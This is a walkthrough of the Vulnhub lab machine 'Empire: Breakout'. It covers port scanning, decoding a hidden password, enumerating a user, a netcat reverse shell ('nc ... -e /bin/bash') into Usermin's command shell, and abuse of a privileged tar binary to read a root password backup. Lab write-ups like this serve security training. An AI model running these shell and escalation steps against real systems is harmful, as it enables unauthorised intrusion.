Vulnhub - Empire: Breakout Walkthrough 
Youtube Link for the walkthrough: https://www.youtube.com/watch?v=HGDcGcCBzFg 

First find the IP Address of the machine 
$ sudo arp-scan -l 

After getting the IP address of the machine, do a nmap scan 
$ nmap -sC -sV -A -p- <ip_address_vulnhub_machine> 
you will find 5 ports open - 80, 139, 445, 10000, 20000 
Take a look at the website http://<ip_address_vulnhub_machine> 
Here you will find an Apache2 Debian Default page 
now in this page, check the source code 
at the end you will find an encoded text, you can decode it to the programming language BrainFuck, and get the output 
now you go to http://<ip_address_vulnhub_machine>:20000, this page requires a username and password 

for this you can enumerate the username using 'enum4linux' 
$ enum4linux -a <ip_address_vulnhub_machine> 
here you will get the username 'cyber', and use the password that was decoded earlier
now after the login, go to Usermin -> login -> command shell 
here you can put the commands. 
you can easily get the user flag and the tar file 
now to spawn a shell, we will use netcat 

On Kali Machine  
$ nc -lvnp 1234 
On Vulnhub Hosted Webpage 
> nc <ip_kali_VM> 1234 -e /bin/bash 

you will get the shell on your kali terminal then 
to spawn a shell 
use > python3 -c 'import pty; pty.spawn("/bin/bash")' 
$ pwd 
$ cd /var -> go to backups folder and you will find the password file, but you will not have the permission to view the file
copy the file to /tmp and then use 
$ /home/cyber/tar -cvf file.tar /var/backups
now when the file is copied in the /tmp folder you can decompress the file
$ tar -xvf file.tar
now you can read the contents of the file and get the contents, which is the root password <br>
use it to login to the root
$ su - root 
while in root you can easily get the root flag
